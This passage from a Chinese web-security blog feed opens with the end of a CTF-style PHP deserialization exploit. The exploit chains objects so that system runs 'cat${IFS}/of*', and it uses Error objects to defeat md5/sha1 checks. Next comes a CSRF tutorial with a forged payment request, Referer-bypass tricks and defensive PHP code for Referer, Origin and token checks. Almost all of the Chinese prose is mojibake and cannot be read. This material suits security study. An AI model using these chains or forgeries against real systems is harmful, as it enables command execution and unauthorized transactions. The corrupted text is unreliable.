class="string">&quot;success&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;dao, [<span class="string">&#x27;è¯—â¼ˆæˆ‘åƒï¼&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeiCaFei</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$HongCaFei</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;HongCaFei, [<span class="number">0</span> =&gt; <span class="variable">$name</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">GOGOGO</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">DouBao</span>();</span><br><span class="line"><span class="variable">$test1</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>, <span class="number">1</span>);<span class="variable">$test2</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>, <span class="number">2</span>);</span><br><span class="line"><span class="variable">$c1</span> = <span class="keyword">new</span> <span class="title class_">HeiCaFei</span>();</span><br><span class="line"><span class="variable">$c2</span> = <span class="keyword">new</span> <span class="title class_">HeiCaFei</span>();</span><br><span class="line"><span class="variable">$c2</span>-&gt;HongCaFei = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$c1</span>-&gt;HongCaFei = [<span class="variable">$c2</span>, <span class="string">&quot;cat\$&#123;IFS&#125;/of*&quot;</span>];</span><br><span class="line"><span class="variable">$b</span>-&gt;dao = [<span class="variable">$c1</span>, <span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>-&gt;Dagongren = <span class="variable">$test1</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;Bagongren = <span class="variable">$test2</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;dengchao = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$pop</span> = <span class="keyword">array</span>(<span class="variable">$a</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;i%3A1%3Bi%3A0%3B%7D&quot;</span>, <span class="string">&quot;i%3A1%3Bi%3A0%3B&quot;</span>,</span><br><span class="line"><span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pop</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="æ€»ç»“-1"><a href="#æ€»ç»“-1" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>åŸç”Ÿç±»errorçš„åˆ©ç”¨å»ç»•è¿‡ç±»ä¸­çš„ï¼š</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( ($<span class="keyword">this</span>-&gt;Dagongren != $<span class="keyword">this</span>-&gt;Bagongren) &amp;&amp; (md5($<span class="keyword">this</span>-&gt;Dagongren)</span><br><span class="line">=== md5($<span class="keyword">this</span>-&gt;Bagongren)) &amp;&amp; (sha1($<span class="keyword">this</span>-&gt;Dagongren)=== sha1($<span class="keyword">this</span>-</span><br><span class="line">&gt;Bagongren)) )</span><br></pre></td></tr></table></figure><p>call_user_func_arrayçš„è°ƒç”¨å’Œä¼ å‚ï¼›<br>_destructå’Œ_tostringçš„åˆ©ç”¨ï¼›</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CSRF(è·¨ç«™è¯·æ±‚ä¼ªé€ )</title>
      <link href="/2025/05/28/CSRF-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
      <url>/2025/05/28/CSRF-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="6-1-csrf-æ¼æ´æè¿°"><a href="#6-1-csrf-æ¼æ´æè¿°" class="headerlink" title="6.1 csrf æ¼æ´æè¿°"></a>6.1 csrf æ¼æ´æè¿°</h1><p>CSRF å®šä¹‰ï¼š è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆè‹±è¯­ï¼šCross-site request forgeryï¼‰ï¼Œä¹Ÿè¢«ç§°ä¸º one-click attack æˆ–è€…<br>session ridingï¼Œé€šå¸¸ç¼©å†™ä¸º CSRF ï¼Œ æ˜¯ä¸€ç§æŒŸåˆ¶ç”¨æˆ·åœ¨å½“å‰å·²ç™»å½•çš„ Web åº”ç”¨ç¨‹åºä¸Šæ‰§è¡Œéæœ¬æ„çš„æ“ä½œçš„æ”»å‡»æ–¹æ³•ã€‚<br>ç®€å•åœ°è¯´ï¼Œæ˜¯æ”»å‡»è€…é€šè¿‡ä¸€äº›æŠ€æœ¯æ‰‹æ®µæ¬ºéª—ç”¨æˆ·çš„æµè§ˆå™¨å»è®¿é—®ä¸€ä¸ªè‡ªå·±æ›¾ç»è®¤è¯è¿‡çš„ç½‘ç«™å¹¶æ‰§è¡Œä¸€äº›æ“ä½œï¼ˆå¦‚å‘é‚®ä»¶ï¼Œå‘æ¶ˆæ¯ï¼Œç”šè‡³è´¢äº§æ“ä½œå¦‚è½¬è´¦å’Œè´­ä¹°å•†å“ï¼‰ã€‚ç”±äºæµè§ˆå™¨æ›¾ç»è®¤è¯è¿‡ï¼Œæ‰€ä»¥è¢«è®¿é—®çš„ç½‘ç«™ä¼šè®¤ä¸ºæ˜¯çœŸæ­£çš„ç”¨æˆ·æ“ä½œè€Œå»æ‰§è¡Œã€‚è¿™åˆ©ç”¨äº† web ä¸­ç”¨æˆ·èº«ä»½éªŒè¯çš„ä¸€ä¸ªæ¼æ´ï¼šç®€å•çš„èº«ä»½éªŒè¯åªèƒ½ä¿è¯è¯·æ±‚å‘è‡ªæŸä¸ªç”¨æˆ·çš„æµè§ˆå™¨ï¼Œå´ä¸èƒ½ä¿è¯è¯·æ±‚æœ¬èº«æ˜¯ç”¨æˆ·è‡ªæ„¿å‘å‡ºçš„ã€‚</p><h1 id="6-2-csrf-æ¼æ´æ”»å‡»åŸç†"><a href="#6-2-csrf-æ¼æ´æ”»å‡»åŸç†" class="headerlink" title="6.2 csrf æ¼æ´æ”»å‡»åŸç†"></a>6.2 csrf æ¼æ´æ”»å‡»åŸç†</h1><p>ç”¨æˆ·æ‰“å¼€æµè§ˆå™¨ï¼Œè®¿é—®ç™»é™†å—ä¿¡ä»»çš„ A ç½‘ç«™</p><p>åœ¨ç”¨æˆ·ä¿¡æ¯é€šè¿‡éªŒè¯åï¼ŒæœåŠ¡å™¨ä¼šè¿”å›ä¸€ä¸ª cookie ç»™æµè§ˆå™¨ï¼Œç”¨æˆ·ç™»é™†ç½‘ç«™ A æˆåŠŸï¼Œå¯ä»¥æ­£å¸¸å‘é€è¯·æ±‚åˆ°ç½‘ç«™ A</p><p>ç”¨æˆ·æœªé€€å‡ºç½‘ç«™ Aï¼Œåœ¨åŒä¸€æµè§ˆå™¨ä¸­ï¼Œæ‰“å¼€ä¸€ä¸ªå±é™©ç½‘ç«™ B</p><p>ç½‘ç«™ B æ”¶åˆ°ç”¨æˆ·è¯·æ±‚åï¼Œè¿”å›ä¸€äº›æ¶æ„ä»£ç ï¼Œå¹¶å‘å‡ºè¯·æ±‚è¦æ±‚è®¿é—®ç½‘ç«™ A</p><p>æµè§ˆå™¨æ”¶åˆ°è¿™äº›æ¶æ„ä»£ç ä»¥åï¼Œåœ¨ç”¨æˆ·ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨ cookie ä¿¡æ¯ï¼Œå‘ç½‘ç«™ A å‘é€æ¶æ„è¯·æ±‚ï¼Œç½‘ç«™A ä¼šæ ¹æ® cookie ä¿¡æ¯ä»¥ç”¨æˆ·çš„æƒé™å»å¤„ç†è¯¥è¯·æ±‚ï¼Œå¯¼è‡´æ¥è‡ªç½‘ç«™ B çš„æ¶æ„ä»£ç è¢«æ‰§è¡Œ</p><h1 id="6-3-CSRF-æ¼æ´æ”»å‡»"><a href="#6-3-CSRF-æ¼æ´æ”»å‡»" class="headerlink" title="6.3 CSRF æ¼æ´æ”»å‡»"></a>6.3 CSRF æ¼æ´æ”»å‡»</h1><p>ä¸€ä¸ªæ•°æ®åŒ…</p><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">å‘apzx7è´¦å·afafaa<span class="variable">@qq</span>.comè½¬è´¦<span class="number">10000</span>çš„è¯·æ±‚</span><br><span class="line">www.alipay/<span class="string">?p</span>ay.html?name=apzx7&amp;account=afafaa<span class="variable">@qq</span>.com&amp;money=<span class="number">10000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">www.apzx.comé¦–é¡µæˆ–æŸä¸ªé¡µé¢å†™ä¸Šä¸€ä¸ªåŠ è½½æ•°æ®åŒ…ä»£ç ï¼ˆä»˜æ¬¾æ•°æ®åŒ…ï¼‰</span><br></pre></td></tr></table></figure><p>å—å®³è€…ç™»å½•ä¸Šå»ï¼ŒåŒæ—¶è®¿é—®<a href="http://www.apzx.com/">www.apzx.com</a>  ç­‰äºè§¦å‘ä»˜æ¬¾æ•°æ®åŒ…</p><p>csrfæ”»å‡»ï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰</p><p>è·¨ç«™<a href="http://www.apzx.comè¯·æ±‚/">www.apzx.comè¯·æ±‚</a></p><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line">è¯·æ±‚ä¼ªé€ www.alipay/?pay.html?<span class="attr">name</span><span class="operator">=</span>apzx7<span class="variable">&amp;account</span>=afafaa@qq.com<span class="variable">&amp;money</span>=<span class="number">10000</span></span><br></pre></td></tr></table></figure><p>â€”-æ²¡é˜²æŠ¤ä¸”èƒ½ç»•è¿‡</p><h3 id="æ”»å‡»æ¡ä»¶"><a href="#æ”»å‡»æ¡ä»¶" class="headerlink" title="æ”»å‡»æ¡ä»¶"></a>æ”»å‡»æ¡ä»¶</h3><p>1.éœ€è¦æ±‚æƒ…ä¼ªé€ æ•°æ®åŒ…ï¼›<br>2.æ— è¿‡æ»¤é˜²æŠ¤ï¼Œæœ‰è¿‡æ»¤èƒ½ç»•è¿‡ï¼›<br>3.å—å®³è€…éœ€è§¦å‘ï¼ˆè¯±æƒ‘ï¼‰</p><p>æ¥åˆ° csrfï¼ˆgetï¼‰æ¼æ´ï¼Œè¾“å…¥ç”¨æˆ·ç™»å½•åå‘ç°ä¿®æ”¹å¯†ç å¤„æ²¡æœ‰ä»»ä½•éªŒè¯ï¼Œå­˜åœ¨ csrf æ”»</p><p>å‡»ï¼Œé€šè¿‡ csrf æ¼æ´æ”»å‡»ä¿®æ”¹èµ„æ–™ã€‚</p><p>ä½¿ç”¨ burpsuite æ„é€ æ”»å‡» exp è¾“å…¥ä¿¡æ¯å é€‰æ‹© generate csrf-poc</p><p>å¤åˆ¶ä¸‹æ¥ å†™å…¥åˆ° poc.html</p><p>å—å®³è€…å—åˆ°æ”»å‡»çš„é€”å¾„æœ‰</p><p>1.å—å®³è€…ç™»å½•ç½‘ç«™åï¼Œæ²¡æœ‰é€€å‡ºçš„æƒ…å†µä¸‹ï¼Œè®¿é—®ç½‘ç«™ b è§¦å‘</p><p>2.åœ¨å­˜åœ¨æ¼æ´çš„ç½‘ç«™ï¼ŒæŒ–æ˜ xss æ¼æ´ï¼Œè‡ªåŠ¨è°ƒç”¨è¿™ poc.html</p><p>å—å®³è€…è®¿é—® poc.html ç‚¹å‡» poc.html</p><h1 id="6-4-CSRF-é˜²å¾¡æ–¹æ¡ˆ"><a href="#6-4-CSRF-é˜²å¾¡æ–¹æ¡ˆ" class="headerlink" title="6.4 CSRF é˜²å¾¡æ–¹æ¡ˆ"></a>6.4 CSRF é˜²å¾¡æ–¹æ¡ˆ</h1><p>1.å¢åŠ  Token éªŒè¯ï¼ˆå¸¸ç”¨åšæ³•ï¼‰</p><p>å¯¹å…³é”®æ“ä½œå¢åŠ  Token å‚æ•°ï¼Œtoken å¿…é¡»éšæœºï¼Œæ¯æ¬¡éƒ½ä¸ä¸€æ ·</p><p>2 å…³äºå®‰å…¨çš„ä¼šè¯ç®¡ç†ï¼ˆé¿å…ä¼šè¯è¢«åˆ©ç”¨ï¼‰</p><p>ä¸è¦åœ¨å®¢æˆ·ç«¯ä¿å­˜æ•æ„Ÿä¿¡æ¯ï¼ˆæ¯”å¦‚èº«ä»½éªŒè¯ä¿¡æ¯ï¼‰</p><p>é€€å‡ºã€å…³é—­æµè§ˆå™¨æ—¶çš„ä¼šè¯è¿‡æœŸæœºåˆ¶</p><p>è®¾ç½®ä¼šè¯è¿‡æœºåˆ¶ï¼Œæ¯”å¦‚ 15 åˆ†é’Ÿæ— æ“ä½œï¼Œåˆ™è‡ªåŠ¨ç™»å½•è¶…æ—¶</p><p>3 è®¿é—®æ§åˆ¶å®‰å…¨ç®¡ç†</p><p>æ•æ„Ÿä¿¡æ¯çš„ä¿®æ”¹æ—¶éœ€è¦èº«ä»½è¿›è¡ŒäºŒæ¬¡è®¤è¯ï¼Œæ¯”å¦‚ä¿®æ”¹è´¦å·å¯†ç ï¼Œéœ€è¦åˆ¤æ–­æ—§å¯†ç </p><p>æ•æ„Ÿä¿¡æ¯çš„ä¿®æ”¹ä½¿ç”¨ POSTï¼Œè€Œä¸æ˜¯ GET</p><p>é€šè¿‡ HTTP å¤´éƒ¨ä¸­çš„ REFERER æ¥é™åˆ¶åŸé¡µé¢</p><p>4 å¢åŠ éªŒè¯ç </p><p>ä¸€èˆ¬åœ¨ç™»å½•ï¼ˆé˜²æš´åŠ›ç ´è§£ï¼‰ï¼Œä¹Ÿå¯ä»¥ç”¨åœ¨å…¶ä»–é‡è¦ä¿¡æ¯æ“ä½œçš„è¡¨å•ä¸­ï¼ˆéœ€è¦è€ƒè™‘å¯ç”¨æ€§ï¼‰</p><h1 id="6-5-åŒæºç­–ç•¥"><a href="#6-5-åŒæºç­–ç•¥" class="headerlink" title="6.5 åŒæºç­–ç•¥"></a>6.5 åŒæºç­–ç•¥</h1><p>ç›‘æµ‹å½“å‰æ•°æ®åŒ…æ˜¯å¦ä¸ºå†…éƒ¨äº§ç”Ÿçš„</p><p>åŸºäºä¸¥è°¨çš„æ£€æµ‹ç»•è¿‡ï¼›<br>åŸºäºä¸ä¸¥è°¨çš„ç›‘æµ‹ç»•è¿‡</p><p>æ£€æµ‹æ˜¯å¦åŒæºï¼š<br>ç›®æ ‡<br>æ”»å‡»</p><p>å®Œå…¨å¯¹æ¯”ï¼šä¸€æ ·æ‰è¡Œ<br>æ— æ³•æ›´æ”¹æ¥æº<br>é…åˆxsså’Œä¸Šä¼ ï¼ˆè§¦å‘æ•°æ®åŒ…ä¿è¯æ˜¯åŒä¸€æ¥æºï¼‰<br>åŒ¹é…å¯¹æ¯”ï¼šæœ‰å°±è¡Œ<br>æ¡ä»¶ï¼šç‚¹å‡»è¿‡æ¥çš„</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">0.0.0.0</span>/<span class="number">8.8.8.8</span>/<span class="number">11</span>.htmlï¼ˆç›®å½•å½¢å¼ï¼‰</span><br></pre></td></tr></table></figure><p>é€»è¾‘åˆ¤æ–­éšæ‚£ï¼šç½®ç©º</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;meta <span class="attribute">name</span>=<span class="string">&quot;referrer&quot;</span> <span class="attribute">content</span>=<span class="string">&quot;&quot;</span><span class="literal">no</span>-referrer&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="PHP-åŒæºæ£€æµ‹çš„ä»£ç ç¤ºä¾‹"><a href="#PHP-åŒæºæ£€æµ‹çš„ä»£ç ç¤ºä¾‹" class="headerlink" title="PHP åŒæºæ£€æµ‹çš„ä»£ç ç¤ºä¾‹"></a>PHP åŒæºæ£€æµ‹çš„ä»£ç ç¤ºä¾‹</h3><p>åŒæºæ£€æµ‹æ˜¯ä¸€ç§åœ¨æœåŠ¡å™¨ç«¯éªŒè¯è¯·æ±‚æ¥æºçš„æ–¹æ³•ï¼Œé€šè¿‡æ£€æŸ¥è¯·æ±‚çš„æ¥æºURLå’Œç›®æ ‡URLæ˜¯å¦åŒ¹é…ï¼Œå¯ä»¥é˜²æ­¢è·¨åŸŸè¯·æ±‚è¢«æ‰§è¡Œã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„å®ç°æ–¹æ³•å’Œä»£ç ç¤ºä¾‹ã€‚</p><h4 id="1-ä½¿ç”¨-HTTP-REFERER-æ£€æµ‹"><a href="#1-ä½¿ç”¨-HTTP-REFERER-æ£€æµ‹" class="headerlink" title="1. ä½¿ç”¨ HTTP_REFERER æ£€æµ‹"></a>1. ä½¿ç”¨ <code>HTTP_REFERER</code> æ£€æµ‹</h4><p><code>HTTP_REFERER</code> æ˜¯ä¸€ä¸ª HTTP å¤´éƒ¨å­—æ®µï¼Œè¡¨ç¤ºè¯·æ±‚çš„æ¥æºé¡µé¢ã€‚é€šè¿‡æ£€æŸ¥ <code>HTTP_REFERER</code>ï¼Œå¯ä»¥éªŒè¯è¯·æ±‚æ˜¯å¦æ¥è‡ªåˆæ³•çš„æ¥æºã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// æ£€æµ‹æ¥æº</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkReferrer</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$expectedReferrer</span> = <span class="string">&quot;http://example.com&quot;</span>; <span class="comment">// æœŸæœ›çš„æ¥æºé¡µé¢</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>]) || <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>] !== <span class="variable">$expectedReferrer</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;éæ³•è®¿é—®&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¤„ç†è¡¨å•æäº¤</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// æ£€æµ‹æ¥æº</span></span><br><span class="line">    <span class="title function_ invoke__">checkReferrer</span>();</span><br><span class="line">    <span class="comment">// è·å–ç”¨æˆ·è¾“å…¥çš„æ•°æ®</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$email</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">    <span class="comment">// è¾“å‡ºç”¨æˆ·è¾“å…¥çš„æ•°æ®</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;å§“åï¼š<span class="subst">$name</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;é‚®ç®±ï¼š<span class="subst">$email</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;æ£€æµ‹æ¥æºç¤ºä¾‹&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;æ£€æµ‹æ¥æºç¤ºä¾‹&lt;/h1&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;&lt;?php echo <span class="subst">$_SERVER</span>[&#x27;PHP_SELF&#x27;]; ?&gt;&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">        &lt;label <span class="keyword">for</span>=<span class="string">&quot;name&quot;</span>&gt;å§“åï¼š&lt;/label&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span> id=<span class="string">&quot;name&quot;</span> required /&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;label <span class="keyword">for</span>=<span class="string">&quot;email&quot;</span>&gt;é‚®ç®±ï¼š&lt;/label&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;email&quot;</span> name=<span class="string">&quot;email&quot;</span> id=<span class="string">&quot;email&quot;</span> required /&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;æäº¤&quot;</span> /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„</strong>ï¼š<code>HTTP_REFERER</code> å¯ä»¥è¢«å®¢æˆ·ç«¯ä¼ªé€ ï¼Œå› æ­¤è¿™ç§æ–¹æ³•å¹¶ä¸å®Œå…¨å¯é ã€‚</p><h4 id="HTTP-REFERERç»•è¿‡"><a href="#HTTP-REFERERç»•è¿‡" class="headerlink" title="HTTP_REFERERç»•è¿‡"></a>HTTP_REFERERç»•è¿‡</h4><p>æŠ“åŒ…ä¿®æ”¹REFERERå€¼ä¸ºåŒç½‘ç«™ï¼›</p><h4 id="2-ä½¿ç”¨-HTTP-ORIGIN-æ£€æµ‹"><a href="#2-ä½¿ç”¨-HTTP-ORIGIN-æ£€æµ‹" class="headerlink" title="2. ä½¿ç”¨ HTTP_ORIGIN æ£€æµ‹"></a>2. ä½¿ç”¨ <code>HTTP_ORIGIN</code> æ£€æµ‹</h4><p><code>HTTP_ORIGIN</code> æ˜¯ä¸€ä¸ª HTTP å¤´éƒ¨å­—æ®µï¼Œè¡¨ç¤ºè¯·æ±‚çš„æ¥æºåŸŸã€‚é€šè¿‡æ£€æŸ¥ <code>HTTP_ORIGIN</code>ï¼Œå¯ä»¥éªŒè¯è¯·æ±‚æ˜¯å¦æ¥è‡ªåˆæ³•çš„åŸŸã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// æ£€æµ‹æ¥æº</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkOrigin</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$allowedOrigins</span> = <span class="keyword">array</span>(<span class="string">&#x27;https://example.com&#x27;</span>, <span class="string">&#x27;https://www.example.com&#x27;</span>); <span class="comment">// å…è®¸çš„åˆæ³•æ¥æº</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ORIGIN&#x27;</span>]) || !<span class="title function_ invoke__">in_array</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ORIGIN&#x27;</span>], <span class="variable">$allowedOrigins</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;éæ³•è®¿é—®&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¤„ç†è¡¨å•æäº¤</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// æ£€æµ‹æ¥æº</span></span><br><span class="line">    <span class="title function_ invoke__">checkOrigin</span>();</span><br><span class="line">    <span class="comment">// è·å–ç”¨æˆ·è¾“å…¥çš„æ•°æ®</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$email</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">    <span class="comment">// è¾“å‡ºç”¨æˆ·è¾“å…¥çš„æ•°æ®</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;å§“åï¼š<span class="subst">$name</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;é‚®ç®±ï¼š<span class="subst">$email</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;æ£€æµ‹æ¥æºç¤ºä¾‹&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;æ£€æµ‹æ¥æºç¤ºä¾‹&lt;/h1&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;&lt;?php echo <span class="subst">$_SERVER</span>[&#x27;PHP_SELF&#x27;]; ?&gt;&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">        &lt;label <span class="keyword">for</span>=<span class="string">&quot;name&quot;</span>&gt;å§“åï¼š&lt;/label&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span> id=<span class="string">&quot;name&quot;</span> required /&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;label <span class="keyword">for</span>=<span class="string">&quot;email&quot;</span>&gt;é‚®ç®±ï¼š&lt;/label&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;email&quot;</span> name=<span class="string">&quot;email&quot;</span> id=<span class="string">&quot;email&quot;</span> required /&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;æäº¤&quot;</span> /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„</strong>ï¼š<code>HTTP_ORIGIN</code> ä¹Ÿå¯ä»¥è¢«å®¢æˆ·ç«¯ä¼ªé€ ï¼Œå› æ­¤è¿™ç§æ–¹æ³•åŒæ ·ä¸å®Œå…¨å¯é ã€‚</p><h4 id="3-ä½¿ç”¨-CSRF-Token-éªŒè¯"><a href="#3-ä½¿ç”¨-CSRF-Token-éªŒè¯" class="headerlink" title="3. ä½¿ç”¨ CSRF Token éªŒè¯"></a>3. ä½¿ç”¨ CSRF Token éªŒè¯</h4><p>ç»™æ¯ä¸€ä¸ªæ•°æ®åŒ…ä¸Šä¸€ä¸ªç¼–å·ï¼›</p><p>CSRF Token æ˜¯ä¸€ç§å¸¸è§çš„é˜²æŠ¤ CSRF æ”»å‡»çš„æ–¹æ³•ã€‚é€šè¿‡ç”Ÿæˆå’ŒéªŒè¯ CSRF Tokenï¼Œå¯ä»¥ç¡®ä¿è¯·æ±‚çš„æ¥æºæ˜¯åˆæ³•çš„ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç”Ÿæˆå¹¶å­˜å‚¨ CSRF Token</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generateCSRFToken</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">32</span>));</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf_token&#x27;</span>] = <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$token</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ£€æŸ¥ CSRF Token æ˜¯å¦æœ‰æ•ˆ</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validateCSRFToken</span>(<span class="params"><span class="variable">$token</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf_token&#x27;</span>]) &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf_token&#x27;</span>] === <span class="variable">$token</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¤„ç†è¡¨å•æäº¤</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// æ£€æŸ¥ CSRF Token</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;csrf_token&#x27;</span>]) || !<span class="title function_ 